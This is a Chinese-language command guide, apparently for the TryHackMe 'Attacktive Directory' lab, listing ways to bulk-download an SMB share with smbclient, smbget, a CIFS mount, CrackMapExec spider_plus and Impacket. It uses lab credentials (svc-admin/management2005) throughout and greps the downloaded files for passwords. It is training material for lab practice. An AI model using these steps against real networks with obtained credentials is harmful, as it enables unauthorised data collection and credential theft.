# SMB 批量下載檔案的方法

## 方法 1: 使用 smbclient 的 mget (推薦)

### 下載所有檔案
```bash
smbclient //10.10.129.69/share_name -U 'svc-admin%management2005'

# 進入 SMB shell 後:
smb: \> prompt off          # 關閉每個檔案的確認提示
smb: \> recurse on          # 啟用遞迴下載子目錄
smb: \> mget *              # 下載所有檔案
```

### 下載特定類型檔案
```bash
smb: \> prompt off
smb: \> mget *.txt          # 只下載 .txt 檔案
smb: \> mget *.docx         # 只下載 .docx 檔案
smb: \> mget *.xml          # 只下載 .xml 檔案
```

### 下載整個目錄
```bash
smb: \> lcd /home/kali/Downloads/smb_files    # 設定本地下載目錄
smb: \> cd backup                              # 切換到遠端目錄
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

---

## 方法 2: 使用一行命令 (非互動式)

### 下載所有檔案
```bash
smbclient //10.10.129.69/backup -U 'svc-admin%management2005' -c 'prompt OFF;recurse ON;cd \;lcd /home/kali/Downloads;mget *'
```

### 下載特定類型
```bash
# 下載所有 .txt 檔案
smbclient //10.10.129.69/backup -U 'svc-admin%management2005' -c 'prompt OFF;mget *.txt'

# 下載所有 .xml 檔案
smbclient //10.10.129.69/backup -U 'svc-admin%management2005' -c 'prompt OFF;mget *.xml'
```

---

## 方法 3: 使用 smbget (遞迴下載)

```bash
# 安裝 smbget (如果沒有)
sudo apt install smbclient -y

# 遞迴下載整個共享
smbget -R smb://10.10.129.69/backup -U svc-admin%management2005

# 下載到指定目錄
smbget -R smb://10.10.129.69/backup -U svc-admin%management2005 -o /home/kali/Downloads/backup
```

---

## 方法 4: 掛載 SMB 共享後複製

```bash
# 創建掛載點
sudo mkdir -p /mnt/smb_share

# 掛載 SMB 共享
sudo mount -t cifs //10.10.129.69/backup /mnt/smb_share -o username=svc-admin,password=management2005

# 複製所有檔案
cp -r /mnt/smb_share/* ~/Downloads/backup/

# 只複製特定類型
cp /mnt/smb_share/*.txt ~/Downloads/backup/

# 使用 find 複製特定類型
find /mnt/smb_share -name "*.xml" -exec cp {} ~/Downloads/backup/ \;

# 卸載
sudo umount /mnt/smb_share
```

---

## 方法 5: 使用 CrackMapExec (針對多個共享)

```bash
# 列出所有共享
crackmapexec smb 10.10.129.69 -u svc-admin -p management2005 --shares

# 蜘蛛爬取並下載
crackmapexec smb 10.10.129.69 -u svc-admin -p management2005 -M spider_plus

# 下載特定模式的檔案
crackmapexec smb 10.10.129.69 -u svc-admin -p management2005 -M spider_plus -o DOWNLOAD_FLAG=True
```

---

## 方法 6: 使用 Impacket smbclient.py

```bash
impacket-smbclient svc-admin:management2005@10.10.129.69

# 進入後:
# use backup
# ls
# get filename
```

---

## 實戰範例 (Attacktive Directory)

### 場景 1: 探索並下載 backup 共享的所有檔案

```bash
# 先列出共享
smbclient -L //10.10.129.69 -U svc-admin%management2005

# 連接到 backup 共享
smbclient //10.10.129.69/backup -U svc-admin%management2005

# 在 SMB shell 中:
smb: \> ls                          # 查看檔案
smb: \> prompt off                  # 關閉確認
smb: \> recurse on                  # 遞迴
smb: \> mget *                      # 下載全部
```

### 場景 2: 一行命令下載所有檔案

```bash
mkdir -p ~/tryhackme/attack/smb_backup
cd ~/tryhackme/attack/smb_backup

smbclient //10.10.129.69/backup -U 'svc-admin%management2005' -c 'prompt OFF;recurse ON;mget *'
```

### 場景 3: 搜尋特定關鍵字的檔案

```bash
# 下載後搜尋
grep -r "password" ~/tryhackme/attack/smb_backup/
grep -r "admin" ~/tryhackme/attack/smb_backup/

# 或在 SMB 中先篩選
smbclient //10.10.129.69/backup -U 'svc-admin%management2005' -c 'ls' | grep -i backup
```

---

## 常用命令速查表

| 命令                 | 說明             |
| -------------------- | ---------------- |
| `ls`                 | 列出檔案         |
| `cd dirname`         | 切換目錄         |
| `lcd /local/path`    | 設定本地下載目錄 |
| `get filename`       | 下載單一檔案     |
| `mget *`             | 下載多個檔案     |
| `mget *.txt`         | 下載特定類型     |
| `prompt off`         | 關閉確認提示     |
| `recurse on`         | 啟用遞迴         |
| `tar c filename.tar` | 打包下載         |

---

## 針對 TryHackMe 的建議

```bash
# 完整流程
cd ~/tryhackme/attack
mkdir smb_files
cd smb_files

# 下載 backup 共享的所有內容
smbclient //10.10.129.69/backup -U 'svc-admin%management2005' << EOF
prompt OFF
recurse ON
mget *
exit
EOF

# 查看下載的檔案
ls -lah
find . -type f

# 搜尋敏感資訊
grep -r "password" .
grep -r "admin" .
cat *.txt
cat *.xml
```

---

## 常見問題

### Q: 檔案太多,想先看有哪些再決定下載?
```bash
smbclient //10.10.129.69/backup -U 'svc-admin%management2005' -c 'ls' > filelist.txt
cat filelist.txt
```

### Q: 只想下載特定目錄?
```bash
smb: \> cd important_folder
smb: \> prompt off
smb: \> mget *
```

### Q: 下載時保持目錄結構?
```bash
# 使用 smbget
smbget -R smb://10.10.129.69/backup/folder -U svc-admin%management2005
```

試試這些方法,找出 backup 共享中的有趣檔案! 通常會有像 `backup_credentials.txt` 之類的敏感檔案 🔍